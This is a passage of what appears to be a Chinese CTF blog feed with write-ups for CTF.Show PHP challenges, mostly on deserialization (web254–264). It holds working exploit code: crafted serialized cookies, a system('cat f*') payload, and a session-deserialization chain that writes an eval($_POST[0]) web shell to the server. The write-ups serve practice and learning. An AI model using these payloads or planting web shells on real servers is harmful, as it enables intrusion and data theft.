<del>（说起来这ctfshow的创始人是不是有什么特殊的xp天天喜欢36d的</del></p><p><del>上回书说道，彼时的璃月</del></p><p>我们在web123中提过，某些字符可以被转换。所以，参照该表，我们还可以用的字符为空格。</p><p>最后请求参数为</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl --location --request GET <span class="string">&#x27;http://08c6da10-0dd4-4d75-b0f7-8d3e70f950c6.challenge.ctf.show:8080/?ctf show=ilove36d&#x27;</span></span><br></pre></td></tr></table></figure><h1 id="web128"><a href="#web128" class="headerlink" title="web128"></a>web128</h1><p><code>PHP Version: 5.6.40</code></p><h2 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h2><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*- </span></span><br><span class="line"><span class="comment"># @Author: h1xa </span></span><br><span class="line"><span class="comment"># @Date:   2020-10-10 11:25:09 </span></span><br><span class="line"><span class="comment"># @Last Modified by:   h1xa </span></span><br><span class="line"><span class="comment"># @Last Modified time: 2020-10-12 19:49:05 </span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span> </span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>); </span><br><span class="line">include(<span class="string">&quot;flag.php&quot;</span>); </span><br><span class="line">highlight_file(__FILE__); </span><br><span class="line"></span><br><span class="line">$f1 = $_GET[<span class="string">&#x27;f1&#x27;</span>]; </span><br><span class="line">$f2 = $_GET[<span class="string">&#x27;f2&#x27;</span>]; </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(check($f1))&#123; </span><br><span class="line">    var_dump(call_user_func(call_user_func($f1,$f2))); </span><br><span class="line">&#125;<span class="keyword">else</span>&#123; </span><br><span class="line">    echo <span class="string">&quot;嗯哼？&quot;</span>; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params">$str</span>)</span>&#123; </span><br><span class="line">    <span class="keyword">return</span> !preg_match(<span class="string">&#x27;/[0-9]|[a-z]/i&#x27;</span>, $str); </span><br><span class="line">&#125; NULL</span><br></pre></td></tr></table></figure><h2 id="知识点-8"><a href="#知识点-8" class="headerlink" title="知识点"></a>知识点</h2><ul><li>对 _() 函数的了解与使用</li></ul><h2 id="做题-10"><a href="#做题-10" class="headerlink" title="做题"></a>做题</h2><p>在 PHP 中，启用了 gettext 扩展的  PHP 程序上，直接调用 <em>() 方法等同于调用 gettext()，也就是说，调用 (“hello”); 会使 PHP 返回 hello 字符串。同时，在此题中使用 get_defined_text 可以获得被定义的变量。由于此处 check() 不允许变量 f1 携带任何字母和数字字符，所以只能从f2进行下手。</em></p><p>在此题中，也就等同于只能访问一个方法使得其获得flag。我们可以使用 <code>/?f1=_&amp;f2=get_defined_vars</code> 来获得 flag</p><h2 id="其他问题"><a href="#其他问题" class="headerlink" title="其他问题"></a>其他问题</h2><ul><li>有没有只通过一个函数来getshell的方法，比如说匿名函数？</li><li>有没有可以通过一个函数+一个参数，但是关键的控制函数（如eval，system等）被限制使用来getshell的方法？</li></ul><h2 id="参考资料-5"><a href="#参考资料-5" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://www.cnblogs.com/lost-1987/articles/3309693.html">toxic</a></p><p><a href="https://www.php.net/manual/zh/book.gettext.php">Gettext</a></p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;web110&quot;&gt;&lt;a href=&quot;#web110&quot; class=&quot;headerlink&quot; title=&quot;web110&quot;&gt;&lt;/a&gt;web110&lt;/h1&gt;&lt;p&gt;&lt;code&gt;PHP Version: 7.3.11&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;仍未解决&lt;/p&gt;
&lt;h2 id=&quot;知识点&quot;&gt;&lt;a href=&quot;#知识点&quot; class=&quot;headerlink&quot; title=&quot;知识点&quot;&gt;&lt;/a&gt;知识点&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;对 PHP 原生类的运用&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;做题&quot;&gt;&lt;a href=&quot;#做题&quot; class=&quot;headerlink&quot; title=&quot;做题&quot;&gt;&lt;/a&gt;做题&lt;/h2&gt;&lt;p&gt;从这题可以看出，这里考察的是对PHP原生类和原生函数的结合运用，但由于我也没啥知识储备，所以还是得先翻一下资料，&lt;del&gt;顺便看一下hint&lt;/del&gt;&lt;/p&gt;
&lt;p&gt;想写下列代码尝试一下，利用 FilesystemIterator 获取指定目录下的所有文件，但是不知道为什么只返回了一个文件名？为什么在这题就可以返回flag的txt，如果恰好flag的名字不在第一个怎么办？&lt;/p&gt;</summary>
    
    
    
    <category term="技术篇" scheme="https://guo.moe/categories/%E6%8A%80%E6%9C%AF%E7%AF%87/"/>
    
    <category term="CTF" scheme="https://guo.moe/categories/%E6%8A%80%E6%9C%AF%E7%AF%87/CTF/"/>
    
    
  </entry>
  
  <entry>
    <title>【Klee-CTF】CTF.Show Web入门 PHP 反序列化 web254~web267</title>
    <link href="https://guo.moe/archives/CTF-Show-Get-Started-with-the-web-PHP-unserialize.html"/>
    <id>https://guo.moe/archives/CTF-Show-Get-Started-with-the-web-PHP-unserialize.html</id>
    <published>2021-08-30T04:00:00.000Z</published>
    <updated>2021-08-30T12:28:36.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="web254"><a href="#web254" class="headerlink" title="web254"></a>web254</h1><p><code>本题目基于 PHP7.3.11</code></p><h2 id="做法"><a href="#做法" class="headerlink" title="做法"></a>做法</h2><p>草，我一开始还以为username要用对象传进去，原来那个xxxxxx就是，那没事了。</p><p>直接访问 /?username=xxxxxx&amp;password=xxxxxx 即可</p><span id="more"></span><p><img data-src="CTF-Show-Get-Started-with-the-web-PHP-unserialize/Untitled.png" alt="CTF-Show-Get-Started-with-the-web-PHP-unserialize/Untitled.png"></p><h1 id="web255"><a href="#web255" class="headerlink" title="web255"></a>web255</h1><p><code>本题目基于 PHP7.3.11</code></p><h2 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h2><ul><li>PHP的对象序列化</li></ul><h2 id="做法-1"><a href="#做法-1" class="headerlink" title="做法"></a>做法</h2><p>设username为test，password为test，<del>注意php反序列化必须将对象内容全部设置完毕，不然不会成功反序列化。</del>好像也不是，回去再试试</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    public $username;</span><br><span class="line">    public $password;</span><br><span class="line">    public $isVip;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$ctf = <span class="keyword">new</span> ctfShowUser();</span><br><span class="line">$ctf-&gt;username = <span class="string">&quot;test&quot;</span>;</span><br><span class="line">$ctf-&gt;password = <span class="string">&quot;test&quot;</span>;</span><br><span class="line">$ctf-&gt;isVip = <span class="literal">true</span>;</span><br><span class="line">echo serialize($ctf);</span><br><span class="line"><span class="comment">// O:11:&quot;ctfShowUser&quot;:3:&#123;s:8:&quot;username&quot;;s:4:&quot;test&quot;;s:8:&quot;password&quot;;s:4:&quot;test&quot;;s:5:&quot;isVip&quot;;b:1;&#125;</span></span><br></pre></td></tr></table></figure><p>再注意丢去urlencode，得</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O%3A11%3A%22ctfShowUser%<span class="number">22</span>%3A3%3A%7Bs%3A8%3A%22username%<span class="number">22</span>%3Bs%3A4%3A%22test%<span class="number">22</span>%3Bs%3A8%3A%22password%<span class="number">22</span>%3Bs%3A4%3A%22test%<span class="number">22</span>%3Bs%3A5%3A%22isVip%<span class="number">22</span>%3Bb%3A1%3B%7D</span><br></pre></td></tr></table></figure><p>放到header，Cookie: user=xxx</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl --location --request GET <span class="string">&#x27;http://55dfc84a-386d-4d27-aa29-872ad23e4c1b.challenge.ctf.show:8080/?username=test&amp;password=test&#x27;</span> \</span><br><span class="line">--header <span class="string">&#x27;Cookie: user=O%3A11%3A%22ctfShowUser%22%3A3%3A%7Bs%3A8%3A%22username%22%3Bs%3A4%3A%22test%22%3Bs%3A8%3A%22password%22%3Bs%3A4%3A%22test%22%3Bs%3A5%3A%22isVip%22%3Bb%3A1%3B%7D&#x27;</span></span><br></pre></td></tr></table></figure><p>your flag is ctfshow{106d93e8-fdba-4ce3-9ea2-6e9dd7e76250}</p><h1 id="web256"><a href="#web256" class="headerlink" title="web256"></a>web256</h1><h2 id="知识点-1"><a href="#知识点-1" class="headerlink" title="知识点"></a>知识点</h2><ul><li>细心的判断</li></ul><h2 id="做法-2"><a href="#做法-2" class="headerlink" title="做法"></a>做法</h2><p>麻痹的，这题还有个判断条件</p><p><img data-src="CTF-Show-Get-Started-with-the-web-PHP-unserialize/Untitled%201.png" alt="CTF-Show-Get-Started-with-the-web-PHP-unserialize/Untitled%201.png"></p><p>将上题中所设的password改为test1获得flag</p><h1 id="web257"><a href="#web257" class="headerlink" title="web257"></a>web257</h1><h2 id="知识点-2"><a href="#知识点-2" class="headerlink" title="知识点"></a>知识点</h2><ul><li>通过PHP序列化覆盖 ctfShowUser 中的 class 变量</li><li>间接修改 backDoor 中的 code 变量</li></ul><h2 id="做法-3"><a href="#做法-3" class="headerlink" title="做法"></a>做法</h2><p><a href="https://www.fatalerrors.org/a/ctfshow-deserialization.html">https://www.fatalerrors.org/a/ctfshow-deserialization.html</a></p><p>按照该网站上的做法，</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    private $class;</span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        $this-&gt;<span class="class"><span class="keyword">class</span></span>=<span class="keyword">new</span> backDoor();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">backDoor</span></span>&#123;</span><br><span class="line">    private $code=<span class="string">&#x27;system(&quot;cat f*&quot;);&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">$b=<span class="keyword">new</span> ctfShowUser();</span><br><span class="line">echo urlencode(serialize($b));</span><br></pre></td></tr></table></figure><p>但我无法复现，即使是改为这样</p><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ctfShowUser</span></span>&#123;</span><br><span class="line">    private $class = <span class="string">&#x27;backDoor&#x27;</span>; <span class="comment">// 修改class为backDoor方便调用</span></span><br><span class="line">    private $username=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    private $password=<span class="string">&#x27;xxxxxx&#x27;</span>;</span><br><span class="line">    private $isVip=<span class="literal">true</span>; <span class="comment">// 改不改好像没所谓，这里题目没有判断</span></span><br><span class="line">    public <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        $this-&gt;<span class="class"><span class="keyword">class</span></span>=<span class="keyword">new</span> backDoor(); <span class="comment">// construct也要覆盖修改一下</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">backDoor</span></span>&#123;</span><br><span class="line">    private $code=<span class="string">&#x27;system(&quot;cat f*&quot;);&#x27;</span>; <span class="comment">// 提前设置好backDoor的code，关键时刻可以</span></span><br><span class="line">&#125;</span><br><span class="line">$b=<span class="keyword">new</span> ctfShowUser();</span><br><span class="line">echo urlencode(serialize($b));</span><br></pre></td></tr></table></figure><p>破案了，你妈将postman输出改成pretty就好了</p><p>（问题：这里construct函数也可以被覆盖吗？还是说因为construct将class给覆盖了？serialize会自动忽略construct函数吗？）</p><h1 id="web260"><a href="#web260" class="headerlink" title="web260"></a>web260</h1><h2 id="知识点-3"><a href="#知识点-3" class="headerlink" title="知识点"></a>知识点</h2><ul><li>PHP的序列化</li></ul><h2 id="做法-4"><a href="#做法-4" class="headerlink" title="做法"></a>做法</h2><figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span> </span>&#123;</span><br><span class="line">    public $text = <span class="string">&quot;ctfshow_i_love_36D&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$object = <span class="keyword">new</span> A();</span><br><span class="line">echo serialize($object);</span><br></pre></td></tr></table></figure><p>/?ctfshow=O:1:”A”:1:{s:4:”text”;s:18:”ctfshow_i_love_36D”;}</p><h1 id="web262"><a href="#web262" class="headerlink" title="web262"></a>web262</h1><p><code>本题目基于 PHP5.6.40</code></p><h2 id="知识点-4"><a href="#知识点-4" class="headerlink" title="知识点"></a>知识点</h2><ul><li>PHP序列化</li><li>修改 Cookie（editthiscookie）</li><li>base64编码</li></ul><h2 id="做法-5"><a href="#做法-5" class="headerlink" title="做法"></a>做法</h2><p>这题原来放在 /message.php 了，亏我还找半天这个 index.php 怎么注入。。。</p><p><img data-src="CTF-Show-Get-Started-with-the-web-PHP-unserialize/Untitled%202.png" alt="CTF-Show-Get-Started-with-the-web-PHP-unserialize/Untitled%202.png"></p><p><img data-src="CTF-Show-Get-Started-with-the-web-PHP-unserialize/Untitled%203.png" alt="CTF-Show-Get-Started-with-the-web-PHP-unserialize/Untitled%203.png"></p><p>该题关键在于将 msg 的 token 设置为 admin</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">message</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$from</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$msg</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$to</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$token</span>=<span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$m</span>,<span class="variable">$t</span></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;from = <span class="variable">$f</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;msg = <span class="variable">$m</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;to = <span class="variable">$t</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$m</span> = <span class="keyword">new</span> message(<span class="string">&quot;a&quot;</span>, <span class="string">&quot;a&quot;</span>, <span class="string">&quot;a&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> base64_encode(serialize(<span class="variable">$m</span>));</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img data-src="CTF-Show-Get-Started-with-the-web-PHP-unserialize/Untitled%204.png" alt="CTF-Show-Get-Started-with-the-web-PHP-unserialize/Untitled%204.png"></p><p>成功拿到flag</p><h1 id="web263"><a href="#web263" class="headerlink" title="web263"></a>web263</h1><p><code>本题目基于 PHP7.3.11</code></p><h2 id="知识点-5"><a href="#知识点-5" class="headerlink" title="知识点"></a>知识点</h2><ul><li>利用字符串拼接注入</li><li>PHP Session 的反序列化漏洞</li><li>备份文件的压缩文件命名</li></ul><h2 id="做法-6"><a href="#做法-6" class="headerlink" title="做法"></a>做法</h2><p>看了 wp，存在<a href="http://www.zip,这指定了类型的谁想得到啊(晕/">www.zip，这指定了类型的谁想得到啊（晕</a></p><p>然后以为可以用通配符蒙混过关（/inc/inc.php），顺便试了一下sqlmap，结果发现有拦截sql注入</p><p>然后发现editthiscookie不好用了，弄得我以为是自己写的问题，坑啊</p><p>关注到 /inc/inc.php 上有一行</p><p><code>ini_set(&#39;session.serialize_handler&#39;, &#39;php&#39;);</code></p><p>参考资料：<a href="https://www.mi1k7ea.com/2019/04/21/PHP-session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/">https://www.mi1k7ea.com/2019/04/21/PHP-session反序列化漏洞/</a></p><p>php 以 | 作为 key和value的分隔符。此处的User中destruct方法有一个file_put_contents，在session反序列化过程中可以利用到User这一个类。</p><p>构造下面的文件来尝试是否产生文件。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$status</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="string">&quot;test.php&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = <span class="string">&quot;&lt;?php&quot;</span> . <span class="string">&#x27; phpinfo(); ?&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$u</span> = <span class="keyword">new</span> User();</span><br><span class="line"><span class="keyword">echo</span> base64_encode(<span class="string">&quot;|&quot;</span> . serialize(<span class="variable">$u</span>));</span><br></pre></td></tr></table></figure><p>将输出的内容放入 cookies 中的 limit 字段，需要注意的是，在放入之前cookies需要先存在 PHPSESSID 字段及 limit 字段（先访问一次index.php，替换完以后再访问一次index.php），然后再访问（check.php）。</p><p>最后访问 log-test.php，查看是否生成 phpinfo();</p><p><img data-src="CTF-Show-Get-Started-with-the-web-PHP-unserialize/Untitled%205.png" alt="CTF-Show-Get-Started-with-the-web-PHP-unserialize/Untitled%205.png"></p><p>可以看到是正常生成的。将内容改为 </p><p><code>&lt;?php eval($POST[0]); ?&gt;</code>  （设置为’x’不知道为什么没法传进去，设置为0就好了）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$status</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;username = <span class="string">&quot;test1.php&quot;</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = <span class="string">&quot;&lt;?php&quot;</span> . <span class="string">&#x27; eval($_POST[0]); ?&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$u</span> = <span class="keyword">new</span> User();</span><br><span class="line"><span class="keyword">echo</span> base64_encode(<span class="string">&quot;|&quot;</span> . serialize(<span class="variable">$u</span>));</span><br></pre></td></tr></table></figure><p>使用 AntSword </p><p><img data-src="CTF-Show-Get-Started-with-the-web-PHP-unserialize/Untitled%206.png" alt="CTF-Show-Get-Started-with-the-web-PHP-unserialize/Untitled%206.png"></p><p>配置完右键打开flag.php拿到flag</p><h1 id="web264"><a href="#web264" class="headerlink" title="web264"></a>web264</h1><p><code>本题目基于 PHP 5.6.40</code></p><h2 id="知识点-6"><a href="#知识点-6" class="headerlink" title="知识点"></a>知识点</h2><ul><li>PHP的反序列化逃逸（字符串变长）</li></ul><h2 id="做法-7"><a href="#做法-7" class="headerlink" title="做法"></a>做法</h2><p>原题代码：index.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-12-03 02:37:19</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-12-03 16:05:38</span></span><br><span class="line"><span class="comment"># <span class="doctag">@message</span>.php</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">session_start();</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">message</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$from</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$msg</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$to</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>=<span class="string">&#x27;user&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$f</span>,<span class="variable">$m</span>,<span class="variable">$t</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;from = <span class="variable">$f</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;msg = <span class="variable">$m</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;to = <span class="variable">$t</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$f</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;f&#x27;</span>];</span><br><span class="line"><span class="variable">$m</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;m&#x27;</span>];</span><br><span class="line"><span class="variable">$t</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;t&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$f</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$m</span>) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$t</span>))&#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="keyword">new</span> message(<span class="variable">$f</span>,<span class="variable">$m</span>,<span class="variable">$t</span>);</span><br><span class="line">    <span class="variable">$umsg</span> = str_replace(<span class="string">&#x27;fuck&#x27;</span>, <span class="string">&#x27;loveU&#x27;</span>, serialize(<span class="variable">$msg</span>));</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;msg&#x27;</span>]=base64_encode(<span class="variable">$umsg</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;Your message has been sent&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br></pre></td></tr></table></figure><p>message.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Author</span>: h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Date</span>:   2020-12-03 15:13:03</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified by:   h1xa</span></span><br><span class="line"><span class="comment"># <span class="doctag">@Last</span> Modified time: 2020-12-03 15:17:17</span></span><br><span class="line"><span class="comment"># <span class="doctag">@email</span>: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"># <span class="doctag">@link</span>: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line">session_start();</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">message</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$from</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$msg</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$to</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>=<span class="string">&#x27;user&#x27;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span 